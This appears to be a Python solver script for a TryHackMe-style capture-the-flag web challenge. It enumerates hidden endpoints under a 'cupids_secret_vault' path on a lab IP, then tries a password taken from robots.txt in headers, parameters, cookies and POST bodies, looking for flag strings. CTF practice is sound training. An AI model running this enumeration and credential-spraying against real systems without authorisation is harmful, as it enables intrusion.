import requests
import re

BASE = "http://10.114.139.59:5000"
FLAG_RE = re.compile(r"THM\{[^}]+\}")
s = requests.Session()

# 1) Big endpoint enum under /cupids_secret_vault/
print("=== Deep vault enum ===")
vault_subs = [
    "api", "api/", "letters", "messages", "read", "write",
    "send", "love", "admin", "flag", "secret", "key",
    "config", "debug", "shell", "exec", "render",
    "template", "file", "download", "upload", "view",
    "page", "load", "include", "fetch", "get",
    "arrow", "cupid", "heart", "valentine", "note", "notes",
    "post", "list", "all", "search", "query", "data",
    "db", "database", "export", "import", "backup",
    "user", "users", "profile", "login", "auth", "token",
    "inbox", "outbox", "sent", "received", "board",
    "wall", "anonymous", "private", "public",
    "letter/1", "message/1", "note/1",
    "api/letters", "api/messages", "api/notes",
    "api/flag", "api/secret", "api/admin",
    "api/read", "api/write", "api/send",
    "api/render", "api/template", "api/fetch",
]

for sub in vault_subs:
    url = f"{BASE}/cupids_secret_vault/{sub}"
    try:
        r = s.get(url, timeout=5, allow_redirects=False)
        if r.status_code != 404:
            body = r.text[:120].replace("\n", " ")
            print(f"  /{sub} -> {r.status_code} ({len(r.text)} bytes) | {body}")
            for f in FLAG_RE.findall(r.text):
                print(f"    [FLAG] {f}")
    except:
        pass

# 2) Try root-level deeper
print("\n=== Root-level deeper enum ===")
root_paths = [
    "/api/v1", "/api/v2", "/v1", "/v2",
    "/api/letters", "/api/messages", "/api/notes",
    "/api/read", "/api/write", "/api/send",
    "/api/render", "/api/template", "/api/fetch",
    "/api/flag", "/api/secret", "/api/config",
    "/api/admin", "/api/export", "/api/user", "/api/users",
    "/note", "/notes", "/letter/1", "/message/1", "/note/1",
    "/render", "/template", "/file", "/load", "/include",
    "/fetch", "/page", "/view", "/download",
    "/send_letter", "/write_letter", "/read_letter",
    "/love_letter", "/anonymous_letter",
    "/static/js/app.js", "/static/js/main.js", "/static/js/script.js",
    "/static/config.js", "/static/api.js",
]

for p in root_paths:
    try:
        r = s.get(f"{BASE}{p}", timeout=5, allow_redirects=False)
        if r.status_code != 404:
            body = r.text[:120].replace("\n", " ")
            print(f"  {p} -> {r.status_code} ({len(r.text)} bytes) | {body}")
            for f in FLAG_RE.findall(r.text):
                print(f"    [FLAG] {f}")
    except:
        pass

# 3) Try with the password/key from robots.txt
print("\n=== Auth attempts with cupid_arrow_2026!!! ===")
key = "cupid_arrow_2026!!!"
vault_url = f"{BASE}/cupids_secret_vault/"

# Various header names
for hdr in ["X-API-Key", "X-Auth-Token", "X-Valentine-Token",
            "X-Cupid-Key", "X-Secret-Key", "Authorization",
            "X-Arrow-Key", "Api-Key", "Secret", "Token", "Key"]:
    r = s.get(vault_url, headers={hdr: key}, timeout=5)
    if len(r.text) != 1064:  # Different from default response
        print(f"  Header {hdr} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")
        for f in FLAG_RE.findall(r.text):
            print(f"    [FLAG] {f}")

# Query params
for param in ["key", "secret", "password", "token", "api_key", "auth", "arrow", "cupid"]:
    r = s.get(vault_url, params={param: key}, timeout=5)
    if len(r.text) != 1064:
        print(f"  Param {param} -> {r.status_code} ({len(r.text)} bytes)")
        print(f"    {r.text[:300]}")
        for f in FLAG_RE.findall(r.text):
            print(f"    [FLAG] {f}")

# Cookie
s2 = requests.Session()
s2.cookies.set("secret", key)
s2.cookies.set("api_key", key)
s2.cookies.set("token", key)
r = s2.get(vault_url, timeout=5)
if len(r.text) != 1064:
    print(f"  Cookie -> {r.status_code} ({len(r.text)} bytes)")
    print(f"    {r.text[:300]}")

# 4) POST with various content types
print("\n=== POST attempts ===")
for ct, data in [
    ("form", {"password": key}),
    ("form", {"secret": key}),
    ("form", {"key": key}),
    ("form", {"arrow": key, "secret": key}),
]:
    for ep in ["/cupids_secret_vault/", "/cupids_secret_vault/login",
               "/cupids_secret_vault/auth", "/cupids_secret_vault/api"]:
        try:
            r = s.post(f"{BASE}{ep}", data=data, timeout=5)
            if r.status_code != 404 and r.status_code != 405:
                print(f"  POST {ep} {data} -> {r.status_code} ({len(r.text)} bytes)")
                print(f"    {r.text[:200]}")
                for f in FLAG_RE.findall(r.text):
                    print(f"    [FLAG] {f}")
        except:
            pass

# JSON POST
import json
for ep in ["/cupids_secret_vault/", "/cupids_secret_vault/api",
           "/api", "/api/"]:
    try:
        r = s.post(f"{BASE}{ep}",
                   json={"password": key, "secret": key, "key": key},
                   timeout=5)
        if r.status_code != 404 and r.status_code != 405:
            print(f"  JSON POST {ep} -> {r.status_code} ({len(r.text)} bytes)")
            print(f"    {r.text[:200]}")
            for f in FLAG_RE.findall(r.text):
                print(f"    [FLAG] {f}")
    except:
        pass
